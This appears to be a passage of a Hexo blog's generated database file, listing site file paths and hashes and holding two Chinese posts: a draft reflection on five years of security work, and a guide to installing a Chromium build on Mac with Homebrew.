fied":1721226399549},{"_id":"public/2020/09/05/Shadow-Box/index.html","hash":"93ae42a140bd9f34e00d4d169d480c3da2bc4e13","modified":1721226399549},{"_id":"public/2019/11/12/Install-Nas/index.html","hash":"52f3941657f243a394d0188dcef19bebb272f63c","modified":1721226399549},{"_id":"public/2019/09/18/Install-Onedrive-Tools/index.html","hash":"8a6411ef3cae0aaa7e0baf1596eddb52f91988f8","modified":1721226399549},{"_id":"public/2019/06/08/Chromium-for-Mac/index.html","hash":"e5bca456bdcb75268f3ea824f0b3f04945ee88da","modified":1721226399549},{"_id":"public/2018/12/21/Clean-macbook/index.html","hash":"06a286e2a7874f708a1e119fb1b64f440b97f794","modified":1721226399549},{"_id":"public/2018/02/25/Install-Mactex/index.html","hash":"3a743ed7c0eb688ece6a02d3f0b156ca2fc8112e","modified":1721226399549},{"_id":"public/2018/02/12/ROP-part2/index.html","hash":"e17c70b8291bac272c980bf6f4a35a6766ce67cf","modified":1721226399549},{"_id":"public/2018/01/28/Website/index.html","hash":"336a83b2ba40c3f0173b07fa63e3c1462a1d451a","modified":1721226399549},{"_id":"public/2018/01/23/ROP-Shellcode/index.html","hash":"016ce369686e11f5c67c87542cdea383be53a430","modified":1721226399549},{"_id":"public/2017/12/03/Graphviz/index.html","hash":"ae7697adf6af320eb0044943c484f5cbe47f1f4f","modified":1721226399549},{"_id":"public/2017/11/26/Firefox57/index.html","hash":"b63c2445cb8b834c6a60663c2d357dc596580faa","modified":1721226399549},{"_id":"public/2017/11/22/ROP-part1/index.html","hash":"b43fba232e010204fa50b104bb5f9f7620aba84e","modified":1721226399549},{"_id":"public/2017/10/21/Wine-Mental-Omega/index.html","hash":"87f85739b5f3d7db13680acea8175e12bf2a8694","modified":1721226399549},{"_id":"public/2017/10/02/Crack-M3U8/index.html","hash":"cab4754270560a57494c7cc1d5b7324e17bf8470","modified":1721226399549},{"_id":"public/2017/01/21/Install-Android-with-Homebrew/index.html","hash":"1bc0940a69145831565e6464f411c51d4d428c4a","modified":1721226399549},{"_id":"public/2016/01/12/Install-Linuxbrew-without-Root/index.html","hash":"16478ef69af0bbfeaa0e79434cb65341e231851d","modified":1721226399549},{"_id":"public/2016/01/10/mirror/index.html","hash":"02e2d053b398a5bd7b2340cb00b0f69fb423aa16","modified":1721226399549},{"_id":"public/2015/06/13/Cuckoo-1/index.html","hash":"1e71376ff010af23c9ee96d23a5fa19d60035bcf","modified":1721226399549},{"_id":"public/2015/05/24/Common/index.html","hash":"7666be6e664014155adf579967eece381f8b247f","modified":1721226399549},{"_id":"public/2015/04/25/Sandbox/index.html","hash":"8bfc783cc10f4ca01bb8b2936c8f5f2ef63f9288","modified":1721226399549},{"_id":"public/2015/04/20/Target/index.html","hash":"1784fcb89cdb6d49e02758a1746b51cf6d6b417c","modified":1721226399549},{"_id":"public/2015/04/12/KaliLinux/index.html","hash":"502a1c7c5ca1f01106ba1786c7e801886436eab2","modified":1721226399549},{"_id":"public/2015/03/21/Cmder/index.html","hash":"072d78b35407c7f5e3e309f12eeed0c0acad5d90","modified":1721226399549},{"_id":"public/2015/03/15/Mactype/index.html","hash":"acf0822cad3ee8399570221ea9ec787383e9aa85","modified":1721226399549},{"_id":"public/2015/02/15/Mac/index.html","hash":"cdf98968a595752b918f84e528d0efb329c9caf5","modified":1721226399549},{"_id":"public/2015/01/25/Scrapy/index.html","hash":"5c0610dc684588cff439b4d7353fe5ab4b3bd00f","modified":1721226399549},{"_id":"public/2015/01/03/Url-Leak/index.html","hash":"0017c8ac970ed3dff54ea25f0c4d004b001d3a10","modified":1721226399549},{"_id":"public/2014/12/12/Node-Development/index.html","hash":"2e5bd520c233c14a336cc20e69e4f5a84e6856dd","modified":1721226399549},{"_id":"public/2014/12/07/Node-Start/index.html","hash":"3a890c5ad7a4dc01443673ab42ef85a04c0d6e5a","modified":1721226399549},{"_id":"public/2014/11/22/Install-Arch-Linux/index.html","hash":"f9d2fb419c98e84c09370139a6e154f355a22688","modified":1721226399549},{"_id":"public/2014/11/20/Hello-World/index.html","hash":"fbd8993874aa014d47ea5eaa11c4071e8d085a1e","modified":1721226399549},{"_id":"public/archives/index.html","hash":"de611cc7c74cd5edc6209d2d4db9d848cb1c6ad1","modified":1721226399549},{"_id":"public/archives/page/2/index.html","hash":"9481db360783f2a896a31baf5aae06c17d485580","modified":1721226399549},{"_id":"public/archives/page/3/index.html","hash":"5842855002a01965cec6f5a51f55c5467f22891a","modified":1721226399549},{"_id":"public/archives/page/4/index.html","hash":"6762bb8259f3065e6c0c715b5d5b6acbb7e40ed3","modified":1721226399549},{"_id":"public/archives/2014/index.html","hash":"ca9dfddb1ef4ae120f0811b01add3ed3a474cabf","modified":1721226399549},{"_id":"public/archives/2014/11/index.html","hash":"34803c3a2d9a2a12c6b2754a605002eb4916ae0b","modified":1721226399549},{"_id":"public/archives/2014/12/index.html","hash":"e56885f325c94f66665e8a2fe45663d626db6174","modified":1721226399549},{"_id":"public/archives/2015/index.html","hash":"e2165e4f90bfa36dbf34b316b738bdc2b74f030f","modified":1721226399549},{"_id":"public/archives/2015/01/index.html","hash":"2e1fbf38ca16049f0b6a2ee23bd4a5238ccd96f6","modified":1721226399549},{"_id":"public/archives/2015/02/index.html","hash":"2e3309a4c7478e42683fdc25c81070116288a5f5","modified":1721226399549},{"_id":"public/archives/2015/03/index.html","hash":"17defa37d2ee7e65e77ff6e1236f3d947e8d41f8","modified":1721226399549},{"_id":"public/archives/2015/04/index.html","hash":"b6913e94fe974ec15fda3654765e1d8a4ee5b0ab","modified":1721226399549},{"_id":"public/archives/2015/05/index.html","hash":"bfc6ab5d33526f2bf358065b876483788849f7d6","modified":1721226399549},{"_id":"public/archives/2015/06/index.html","hash":"57a896d3da28da6b83addc6342fb2406c71df9b3","modified":1721226399549},{"_id":"public/archives/2016/index.html","hash":"e62408f04e0316abcc7259c3981d1119e81cc038","modified":1721226399549},{"_id":"public/archives/2016/01/index.html","hash":"820330f3eed6eb050ff9e26f20ca0a886d6256d7","modified":1721226399549},{"_id":"public/archives/2017/index.html","hash":"b17e771b6dfcc3804f1e8cfa147746841677ce65","modified":1721226399549},{"_id":"public/archives/2017/01/index.html","hash":"8edfb6132f5f1e3489e1a3e20bf98a14e8f39d93","modified":1721226399549},{"_id":"public/archives/2017/10/index.html","hash":"3a8798e18eb80a24e95a31b093d2ccc6d0bd2687","modified":1721226399549},{"_id":"public/archives/2017/11/index.html","hash":"3b0ed880610addc9fb9f9dc1d8ddd60e0ecd19a7","modified":1721226399549},{"_id":"public/archives/2017/12/index.html","hash":"46b6f8f03f99d99f257683a71b03cdcb2136d218","modified":1721226399549},{"_id":"public/archives/2018/index.html","hash":"43e3c8ae4abdc15a34db51cba84af96bf6c46bf8","modified":1721226399549},{"_id":"public/archives/2018/01/index.html","hash":"139ad936296613b19b6f5b8dad26b36519a8baeb","modified":1721226399549},{"_id":"public/archives/2018/02/index.html","hash":"df6a5b74d494fc9da87bcafba39ffa3ee899dc12","modified":1721226399549},{"_id":"public/archives/2018/12/index.html","hash":"2f67589c3b610ca2a83ddf0a5651bf63aaee94dd","modified":1721226399549},{"_id":"public/archives/2019/index.html","hash":"9d81c4607475635eba1c686f9097a22ccb641216","modified":1721226399549},{"_id":"public/archives/2019/06/index.html","hash":"638249012bb3cec6fd156ffd48975248192372ca","modified":1721226399549},{"_id":"public/archives/2019/09/index.html","hash":"6fb84ddb4586b09238bee5144425d93526ba1e1d","modified":1721226399549},{"_id":"public/archives/2019/11/index.html","hash":"544b3e92b14f69d7429084a66e923cd04b5963cd","modified":1721226399549},{"_id":"public/archives/2020/index.html","hash":"d3e0008ad535a48aca896913ab5837aec26dc3b5","modified":1721226399549},{"_id":"public/archives/2020/09/index.html","hash":"6c2d2484efab4bfc8f776cf31821a50b771c9bb4","modified":1721226399549},{"_id":"public/index.html","hash":"85d20175d4cb776188f0bd816666758924f1390c","modified":1721226399549},{"_id":"public/page/2/index.html","hash":"e60439597c8c2e06f41059e343ad809109a4706f","modified":1721226399549},{"_id":"public/page/3/index.html","hash":"274bf16b61c5806b3a542a088970bf9b1a414701","modified":1721226399549},{"_id":"public/page/4/index.html","hash":"c4e0ecddebab84e6379f7847f76f4d44f4f85f8a","modified":1721226399549},{"_id":"public/tags/Windows/index.html","hash":"08e5093ec4ff5834dd07e8e41ae162cf6c6d3f44","modified":1721226399549},{"_id":"public/tags/Flash/index.html","hash":"2afad5ba08876c1439513bde197a7f418ca55abb","modified":1721226399549},{"_id":"public/tags/Web/index.html","hash":"56ba91f836ab65f983c6b868622fb78450338dfd","modified":1721226399549},{"_id":"public/tags/Mac/index.html","hash":"b862285759938dfcd423f3b976ef01263ba53396","modified":1721226399549},{"_id":"public/tags/Android/index.html","hash":"451b72a4c591c4648ba4516ea75228cc0d1b2888","modified":1721226399549},{"_id":"public/tags/Linux/index.html","hash":"ec22fe5bcc6ea0d416015ec3407db923096a15cf","modified":1721226399549},{"_id":"public/tags/Exploit/index.html","hash":"e571470f5e3c1a00347f5b7a3bd10667d95d5787","modified":1721226399549},{"_id":"public/graph/stack.gv","hash":"e65a2eaf274494629b450c9c02a8c95dfa364a3e","modified":1721226399549},{"_id":"public/graph/test.dot","hash":"3b21130b5ff899f3af349e7836d0cc1715438289","modified":1721226399549},{"_id":"public/graph/test.png","hash":"22e34674634e7d94a0f9fb849002833249a622e1","modified":1721226399549},{"_id":"public/img/rop_execute.png","hash":"f67ca0f4770ac367486d8753b89e440aab22f805","modified":1721226399549},{"_id":"public/img/rop_stack_1.png","hash":"cbfe3134f4c9350bfd2a04d0bf44e1f7db1d5681","modified":1721226399549},{"_id":"public/img/rop_stack_2.png","hash":"9a006c103bcc47f08eb0df2b9d494f641b027d1a","modified":1721226399549},{"_id":"public/img/rop_stack_3.png","hash":"5d8ad533233dbe076fb0ef23bd1b49ccfde32eab","modified":1721226399549},{"_id":"public/img/rop_stack_4.png","hash":"ee9533afb7374bea2e77812aad0bd3cdc4c4e8dc","modified":1721226399549},{"_id":"public/img/rop_stack_5.png","hash":"22e34674634e7d94a0f9fb849002833249a622e1","modified":1721226399549},{"_id":"public/img/s0.png","hash":"4ae37d411642a1f21ce875280873cb35a4aff966","modified":1721226399549},{"_id":"public/img/vmware-list.png","hash":"bd4e2db3f79faa01b355aa305b571a72edb17ccb","modified":1721226399549},{"_id":"public/img/vmware-lock.png","hash":"2c42a00c7b5311138e03f3fc58a1109c2e31678a","modified":1721226399549},{"_id":"public/img/vs_b.png","hash":"9577c1139e613daf1644a1cbe4be82aa66a78980","modified":1721226399549},{"_id":"public/img/favicon/android-chrome-192x192.png","hash":"426e9a28eea4fe05898301c61df7adcbd183230e","modified":1721226399549},{"_id":"public/img/favicon/android-chrome-384x384.png","hash":"ee2d4aa8faf46eb224a7995b4549913747ad7231","modified":1721226399549},{"_id":"public/img/favicon/apple-touch-icon.png","hash":"659e0c5b3ebe1f6efbe27837a5ec9db45f68141d","modified":1721226399549},{"_id":"public/img/favicon/browserconfig.xml","hash":"ebff04b9c4734ffadb375cbe2295de48995ffea7","modified":1721226399549},{"_id":"public/img/favicon/favicon-16x16.png","hash":"170e33059c0993e1a797a01ef56c92ecc730d218","modified":1721226399549},{"_id":"public/img/favicon/favicon-32x32.png","hash":"697ba4ee414e607da92b16f5f4b31b2320f9c7aa","modified":1721226399549},{"_id":"public/img/favicon/favicon.ico","hash":"1f5df905ca171abff3fad9c80548ad20a21b28c4","modified":1721226399549},{"_id":"public/img/favicon/mstile-150x150.png","hash":"9c30adca69e1918fa0ad8e449ca3ee332179cb43","modified":1721226399549},{"_id":"public/img/favicon/safari-pinned-tab.svg","hash":"f98a4aa5bc4ab6572e8d39185670c5bea423c3d4","modified":1721226399549},{"_id":"public/img/favicon/site.webmanifest","hash":"d25511d6b902131d4feccf44b23788ddf10ab4a0","modified":1721226399549},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1721226399549},{"_id":"public/images/avatar.gif","hash":"2dbc3e2f2d624b2ca1afe6edc2ca17307f1950c8","modified":1721226399549},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1721226399549},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1721226399549},{"_id":"public/images/logo-algolia-nebula-blue-full.svg","hash":"b85e274207b1392782476a0430feac98db1e7da0","modified":1721226399549},{"_id":"public/images/logo.svg","hash":"099e11ab995a2c8981427a85476d082609848c77","modified":1721226399549},{"_id":"public/img/vs_a.png","hash":"126a13162f2db9976281ec8bb9157686abeecba5","modified":1721226399549},{"_id":"public/css/main.css","hash":"c91901b03253157ced78a6afd337d389f3581a7c","modified":1721226399549},{"_id":"public/css/noscript.css","hash":"4cd5301e478e0e0d4b176740ec314087ec5cb707","modified":1721226399549},{"_id":"public/js/bookmark.js","hash":"0f563ffbf05fad30e854e413ab17ff7164ab5a53","modified":1721226399549},{"_id":"public/js/comments-buttons.js","hash":"1a7344440321713426a0b2ab17e276b5bdf85ade","modified":1721226399549},{"_id":"public/js/comments.js","hash":"66ae2e26ea36a41b72c638ea8b220296638ae952","modified":1721226399549},{"_id":"public/js/config.js","hash":"4c4ebbe3b3f3841a26f9d5af6d0ba8bc6da01c54","modified":1721226399549},{"_id":"public/js/motion.js","hash":"8e587c086e3cf8687108fbb3241fe1534c3df463","modified":1721226399549},{"_id":"public/js/next-boot.js","hash":"8e2d589585f5270ee90285d3e65b69923c7629d8","modified":1721226399549},{"_id":"public/js/pjax.js","hash":"adc751f9b63b7a6b4d381506d35a1b3ff4de891f","modified":1721226399549},{"_id":"public/js/schedule.js","hash":"a1333258726caf84f368a8f8454639c7dc1626bb","modified":1721226399549},{"_id":"public/js/sidebar.js","hash":"b3289010a0cb52c525b1395db72bd463424f2f48","modified":1721226399549},{"_id":"public/js/utils.js","hash":"f92420649b150703469bba41cbd5c72768beed88","modified":1721226399549},{"_id":"public/js/third-party/addtoany.js","hash":"5276c8f78ee562a8965216dc67d762e59cb4a9f2","modified":1721226399549},{"_id":"public/js/third-party/fancybox.js","hash":"819f382c561fe5ec23c67cc5fabd63dd1cc22dc1","modified":1721226399549},{"_id":"public/js/third-party/pace.js","hash":"0ef04218b93561ba4d0ff420d556c3d90a756d32","modified":1721226399549},{"_id":"public/js/third-party/quicklink.js","hash":"eed02e6fced8e5a653077205d4d4d7834ca71472","modified":1721226399549},{"_id":"public/js/third-party/analytics/baidu-analytics.js","hash":"f629acc46ff40c071ffd31b77d5c7616f0fdd778","modified":1721226399549},{"_id":"public/js/third-party/analytics/google-analytics.js","hash":"def07bcc7c17d8a0caad177fb1dd2f3a5e5b3536","modified":1721226399549},{"_id":"public/js/third-party/analytics/growingio.js","hash":"78dd3cf04082b7dbe6246e404b2aa8e726922402","modified":1721226399549},{"_id":"public/js/third-party/analytics/matomo.js","hash":"c6a25b26a1443caa70b47fd3dfa282271574deb5","modified":1721226399549},{"_id":"public/js/third-party/chat/chatra.js","hash":"c32180522788c10e51df1803aa6842ef0432ddc9","modified":1721226399549},{"_id":"public/js/third-party/chat/tidio.js","hash":"b0079f6a4601e06ca6fe46e83a2f5af553e9bc3c","modified":1721226399549},{"_id":"public/js/third-party/comments/changyan.js","hash":"260d1a77d6a3bb33a579d3e4cca1997003e799b5","modified":1721226399549},{"_id":"public/js/third-party/comments/disqus.js","hash":"da361917d65e5dca8362f8cdeb6c8cc0e8316cec","modified":1721226399549},{"_id":"public/js/third-party/comments/disqusjs.js","hash":"1e826dea3f684c0515f362dc1352447a1f0eae71","modified":1721226399549},{"_id":"public/js/third-party/comments/gitalk.js","hash":"0ec038cf83e8ec067534f16a54041e47a3c1e59a","modified":1721226399549},{"_id":"public/js/third-party/comments/isso.js","hash":"753a873b6f566aff5ba77ca23f91b78eb880ca64","modified":1721226399549},{"_id":"public/js/third-party/comments/livere.js","hash":"2247d88c934c765c43013337860774aaa99f0b31","modified":1721226399549},{"_id":"public/js/third-party/comments/utterances.js","hash":"f67f90eb03e284c82da2b8cf2f1e31801813c16d","modified":1721226399549},{"_id":"public/js/third-party/math/katex.js","hash":"83c54ee536e487a1031783443fe0cb63b1b4767e","modified":1721226399549},{"_id":"public/js/third-party/math/mathjax.js","hash":"5c749b9c1c3bb738122d0516211ecff6496d4907","modified":1721226399549},{"_id":"public/js/third-party/search/algolia-search.js","hash":"fdb7b7cef1a147d897e7f7cd8903b58368ec2062","modified":1721226399549},{"_id":"public/js/third-party/search/local-search.js","hash":"4536cb6d0a9bbaaa86fab3fa0101f6a3a3ec5a76","modified":1721226399549},{"_id":"public/js/third-party/statistics/firestore.js","hash":"6e0682bb42170d61b13b786295f45f9c785f8b73","modified":1721226399549},{"_id":"public/js/third-party/statistics/lean-analytics.js","hash":"835cbf54c49ef1327f47df70ff2636ad36b6f57d","modified":1721226399549},{"_id":"public/js/third-party/tags/mermaid.js","hash":"6bf821310342c5b87a631873e7650a475a0765f1","modified":1721226399549},{"_id":"public/js/third-party/tags/pdf.js","hash":"af78c22f0e61c8c8aa8794e585e0d632c6d4fcb8","modified":1721226399549},{"_id":"public/js/third-party/tags/wavedrom.js","hash":"40dcd10df6edf124088c329346e0cc0bdac74ef1","modified":1721226399549},{"_id":"public/img/cmder.png","hash":"5280ec1941a17feeafe522fa0726338469000e51","modified":1721226399549},{"_id":"public/img/cleanmac.png","hash":"bfdc926813ee5bd5200fe7124129e91d8549fc31","modified":1721226399549},{"_id":"public/img/wine-MentalOmega.png","hash":"2ce6726864ba834abea917fea8fe8e48ff1e724b","modified":1721226399549}],"Category":[],"Data":[],"Page":[{"title":"categories","date":"2018-01-16T21:40:04.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"title: categories\ndate: 2018-01-16 21:40:04\ntype: \"categories\"\n---\n","updated":"2020-09-07T02:31:06.572Z","path":"categories/index.html","comments":1,"layout":"page","_id":"clypxqmm40000xrn50547aq2i","content":"","excerpt":"","more":""},{"title":"tags","date":"2018-01-16T21:39:53.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"title: tags\ndate: 2018-01-16 21:39:53\ntype: \"tags\"\n---\n","updated":"2020-09-07T02:31:06.603Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clypxqmme0002xrn56lmqagbi","content":"","excerpt":"","more":""}],"Post":[{"title":"工作五年回顾","date":"2019-07-12T20:57:09.000Z","updated":"2019-07-20T21:18:33.000Z","_content":"\n一眨眼整整入职五年了，现在回想起来\n\n## 前三年\n\n前三年是比较单纯的三年，从来只知道干活干活干活。现在想来，本事没有学到多少，活却干的不少，各个方面浅尝辄止，虽然表面上也是各种都经历过，但是真正沉淀下来的却很少。\n\n随之而来的就是焦虑，如何跳槽，下一步怎么做。\n\n## 后两年\n\n这两年对我是一场彻彻底底的折磨吧。\n\n## 某同事\n\n最近某位我很欣赏的同事因为家庭感情因素最终离开北京了， 不得不说他在公司发展的非常好，团队大多数的贡献都能体现在他身上，是我值得学习的榜样。回想现在团队的各位同事，虽然正式加入他们才不久，但是却已经合作已久，看着这个团队成长，获奖，称为国内安全领域首屈一指的团队。\n\n## 未来\n\n重新捡起之前的 Fuzz ，想着能不能进入下一年的 MSRC Top 100。我也知道挑战很大，努力吧，让我做出点有价值事，能在历史上留下一点印记。\n\n## 最后\n\n这篇文章暂时存放在草稿箱，获取是终究对自己不敢有那么高的自信吧，也不知道目标能不能完成。","source":"_drafts/Five-years-life.md","raw":"title: 工作五年回顾\ndate: 2019-07-12 20:57:09\nupdated: 2019-07-20 21:18:33\ntags:\n---\n\n一眨眼整整入职五年了，现在回想起来\n\n## 前三年\n\n前三年是比较单纯的三年，从来只知道干活干活干活。现在想来，本事没有学到多少，活却干的不少，各个方面浅尝辄止，虽然表面上也是各种都经历过，但是真正沉淀下来的却很少。\n\n随之而来的就是焦虑，如何跳槽，下一步怎么做。\n\n## 后两年\n\n这两年对我是一场彻彻底底的折磨吧。\n\n## 某同事\n\n最近某位我很欣赏的同事因为家庭感情因素最终离开北京了， 不得不说他在公司发展的非常好，团队大多数的贡献都能体现在他身上，是我值得学习的榜样。回想现在团队的各位同事，虽然正式加入他们才不久，但是却已经合作已久，看着这个团队成长，获奖，称为国内安全领域首屈一指的团队。\n\n## 未来\n\n重新捡起之前的 Fuzz ，想着能不能进入下一年的 MSRC Top 100。我也知道挑战很大，努力吧，让我做出点有价值事，能在历史上留下一点印记。\n\n## 最后\n\n这篇文章暂时存放在草稿箱，获取是终究对自己不敢有那么高的自信吧，也不知道目标能不能完成。","slug":"Five-years-life","published":0,"comments":1,"layout":"post","photos":[],"_id":"clypxqmm90001xrn55nha6qyr","content":"<p>一眨眼整整入职五年了，现在回想起来</p>\n<h2 id=\"前三年\"><a href=\"#前三年\" class=\"headerlink\" title=\"前三年\"></a>前三年</h2><p>前三年是比较单纯的三年，从来只知道干活干活干活。现在想来，本事没有学到多少，活却干的不少，各个方面浅尝辄止，虽然表面上也是各种都经历过，但是真正沉淀下来的却很少。</p>\n<p>随之而来的就是焦虑，如何跳槽，下一步怎么做。</p>\n<h2 id=\"后两年\"><a href=\"#后两年\" class=\"headerlink\" title=\"后两年\"></a>后两年</h2><p>这两年对我是一场彻彻底底的折磨吧。</p>\n<h2 id=\"某同事\"><a href=\"#某同事\" class=\"headerlink\" title=\"某同事\"></a>某同事</h2><p>最近某位我很欣赏的同事因为家庭感情因素最终离开北京了， 不得不说他在公司发展的非常好，团队大多数的贡献都能体现在他身上，是我值得学习的榜样。回想现在团队的各位同事，虽然正式加入他们才不久，但是却已经合作已久，看着这个团队成长，获奖，称为国内安全领域首屈一指的团队。</p>\n<h2 id=\"未来\"><a href=\"#未来\" class=\"headerlink\" title=\"未来\"></a>未来</h2><p>重新捡起之前的 Fuzz ，想着能不能进入下一年的 MSRC Top 100。我也知道挑战很大，努力吧，让我做出点有价值事，能在历史上留下一点印记。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>这篇文章暂时存放在草稿箱，获取是终究对自己不敢有那么高的自信吧，也不知道目标能不能完成。</p>\n","excerpt":"","more":"<p>一眨眼整整入职五年了，现在回想起来</p>\n<h2 id=\"前三年\"><a href=\"#前三年\" class=\"headerlink\" title=\"前三年\"></a>前三年</h2><p>前三年是比较单纯的三年，从来只知道干活干活干活。现在想来，本事没有学到多少，活却干的不少，各个方面浅尝辄止，虽然表面上也是各种都经历过，但是真正沉淀下来的却很少。</p>\n<p>随之而来的就是焦虑，如何跳槽，下一步怎么做。</p>\n<h2 id=\"后两年\"><a href=\"#后两年\" class=\"headerlink\" title=\"后两年\"></a>后两年</h2><p>这两年对我是一场彻彻底底的折磨吧。</p>\n<h2 id=\"某同事\"><a href=\"#某同事\" class=\"headerlink\" title=\"某同事\"></a>某同事</h2><p>最近某位我很欣赏的同事因为家庭感情因素最终离开北京了， 不得不说他在公司发展的非常好，团队大多数的贡献都能体现在他身上，是我值得学习的榜样。回想现在团队的各位同事，虽然正式加入他们才不久，但是却已经合作已久，看着这个团队成长，获奖，称为国内安全领域首屈一指的团队。</p>\n<h2 id=\"未来\"><a href=\"#未来\" class=\"headerlink\" title=\"未来\"></a>未来</h2><p>重新捡起之前的 Fuzz ，想着能不能进入下一年的 MSRC Top 100。我也知道挑战很大，努力吧，让我做出点有价值事，能在历史上留下一点印记。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>这篇文章暂时存放在草稿箱，获取是终究对自己不敢有那么高的自信吧，也不知道目标能不能完成。</p>\n"},{"title":"Mac 上安装 Chromium","date":"2019-06-08T16:35:13.000Z","updated":"2019-06-10T23:04:26.000Z","_content":"\n最开始我一直是 Firefox 党，也简单写过了几篇关于 Firefox 使用的文章，例如[《Firefox57新版试用》](/2017/11/26/Firefox57/)，但是后来发现 Firefox 在 Mac 上经常性的出现风扇狂转的现象，因此不得不转移到了 Chrome 上，所幸两者的丰富插件使得使用体验上基本一致。但是近几年 Chrome 的隐私问题越来越严重，我也不得不对持续使用 Chrome 打上了问号。因此想着能否使用 Chromium 来替代。\n\n# Chromium 介绍\n\n众所周知，Chrome 是谷歌开发的一个网页浏览器，但是这个浏览器也不是完全从零开始的，而是采用了大量的开源代码，最重要的部分就是苹果的 Webkit，谷歌也开源了大量 Chrome 相关的源码回馈到开源社区，著名的 NodeJS 就是基于谷歌开源的 V8 Javascript 解释引擎实现的的。基于谷歌的 Chrome 开源代码内容，编译得到的就是 Chromium。\n\n相比 Chrome，Chromium 缺少了某些闭源的二进制代码，比如 Flash 插件，商业解码器等，也不会有任何谷歌的标识，因此国内的浏览器厂商也都选择基于 Chromium 来作为他们自己浏览器的内核。\n\n正如上文所说，Chromium 中缺乏了部分闭源代码，对此主要是有两方面的影响，第一是很多 Chrome 自带的服务都无法使用，这个恰恰是我们所希望的，缺乏谷歌的服务能够大幅提升隐私性；第二个影响则是缺乏视频解码，这个则会对我们平时的网页浏览带来非常大的影响。因此默认 Chromium 官网提供的并不能实际使用，而我选择的是开发者 marmaduke 编译的带有解码器的版本。关于 Chromium 可用版本的列表可以参考网页 https://chromium.woolyss.com/，该页面提供了致命的第三方编译 Chromium 列表，可以自行选用。\n\n最终，我选择了自带解码器的 marmaduke 编译的 Chromium，值得注意的是，该作者提供了三个版本的 Chromium 分别是。\n\n* marmaduke-chromium 最基础的版本，猜测应该是标准 Chromium 外加视频解码器\n* marmaduke-chromium-nosync 去除了 Chromium 中的 Google Sync 和 Widevine（一种加密视频协议）。\n* marmaduke-chromium-ungoogled 更为激进的一个版本，去除了谷歌的同步，各种服务，以及相关的二进制文件，同时也带来了一些安全上的改进，具体的内容可以参考 [UNGOOGLED Chromium](https://github.com/Eloston/ungoogled-chromium/blob/master/README.md)，注意这个版本无法从 Chrome Webstore 下载和更新扩展程序。 \n\n唯一要注意的是上述三个不可以同时安装，简单挑选一个即可，在 Mac 上的具体安装步骤如下：\n\n```\nbrew tap cpbotha/marmaduke-chromium\nbrew cask install marmaduke-chromium\nbrew cask install marmaduke-chromium-nosync\nbrew cask install marmaduke-chromium-ungoogled\n```\n\n至于我的个人选择，本来是想优先选用 marmaduke-chromium-ungoogled，但是因为扩展程序更新不方便，还是退而求其次选择 marmaduke-chromium 吧。\n\n# 扩展持续列表\n\n最后，仍然仿照 Firefox 列出我所使用的扩展列表（按照字母排序）：\n\n## 1. cVim\n\n可以仿照 Vim 的快捷键来进行网页浏览。\n\n## 2. HTTPS Everywhere\n\n自动访问加密版本的网址。\n\n## 3. LastPass\n\n密码管理。\n\n## 4. Proxy SwitchyOmega\n\n自动翻墙代理。\n\n## 5. Save to Pocket\n\n保存网页到 Pocket。\n\n## 6. Tampermonkey\n\n油猴子脚本插件。\n\n## 7. uBlock Origin\n\n屏蔽广告。\n\n## 8. uMatrix\n\n屏蔽网页内容和脚本。\n","source":"_posts/Chromium-for-Mac.md","raw":"title: Mac 上安装 Chromium\ndate: 2019-06-08 16:35:13\nupdated: 2019-06-10 23:04:26\ntags:\n---\n\n最开始我一直是 Firefox 党，也简单写过了几篇关于 Firefox 使用的文章，例如[《Firefox57新版试用》](/2017/11/26/Firefox57/)，但是后来发现 Firefox 在 Mac 上经常性的出现风扇狂转的现象，因此不得不转移到了 Chrome 上，所幸两者的丰富插件使得使用体验上基本一致。但是近几年 Chrome 的隐私问题越来越严重，我也不得不对持续使用 Chrome 打上了问号。因此想着能否使用 Chromium 来替代。\n\n# Chromium 介绍\n\n众所周知，Chrome 是谷歌开发的一个网页浏览器，但是这个浏览器也不是完全从零开始的，而是采用了大量的开源代码，最重要的部分就是苹果的 Webkit，谷歌也开源了大量 Chrome 相关的源码回馈到开源社区，著名的 NodeJS 就是基于谷歌开源的 V8 Javascript 解释引擎实现的的。基于谷歌的 Chrome 开源代码内容，编译得到的就是 Chromium。\n\n相比 Chrome，Chromium 缺少了某些闭源的二进制代码，比如 Flash 插件，商业解码器等，也不会有任何谷歌的标识，因此国内的浏览器厂商也都选择基于 Chromium 来作为他们自己浏览器的内核。\n\n正如上文所说，Chromium 中缺乏了部分闭源代码，对此主要是有两方面的影响，第一是很多 Chrome 自带的服务都无法使用，这个恰恰是我们所希望的，缺乏谷歌的服务能够大幅提升隐私性；第二个影响则是缺乏视频解码，这个则会对我们平时的网页浏览带来非常大的影响。因此默认 Chromium 官网提供的并不能实际使用，而我选择的是开发者 marmaduke 编译的带有解码器的版本。关于 Chromium 可用版本的列表可以参考网页 https://chromium.woolyss.com/，该页面提供了致命的第三方编译 Chromium 列表，可以自行选用。\n\n最终，我选择了自带解码器的 marmaduke 编译的 Chromium，值得注意的是，该作者提供了三个版本的 Chromium 分别是。\n\n* marmaduke-chromium 最基础的版本，猜测应该是标准 Chromium 外加视频解码器\n* marmaduke-chromium-nosync 去除了 Chromium 中的 Google Sync 和 Widevine（一种加密视频协议）。\n* marmaduke-chromium-ungoogled 更为激进的一个版本，去除了谷歌的同步，各种服务，以及相关的二进制文件，同时也带来了一些安全上的改进，具体的内容可以参考 [UNGOOGLED Chromium](https://github.com/Eloston/ungoogled-chromium/blob/master/README.md)，注意这个版本无法从 Chrome Webstore 下载和更新扩展程序。 \n\n唯一要注意的是上述三个不可以同时安装，简单挑选一个即可，在 Mac 上的具体安装步骤如下：\n\n```\nbrew tap cpbotha/marmaduke-chromium\nbrew cask install marmaduke-chromium\nbrew cask install marmaduke-chromium-nosync\nbrew cask install marmaduke-chromium-ungoogled\n```\n\n至于我的个人选择，本来是想优先选用 marmaduke-chromium-ungoogled，但是因为扩展程序更新不方便，还是退而求其次选择 marmaduke-chromium 吧。\n\n# 扩展持续列表\n\n最后，仍然仿照 Firefox 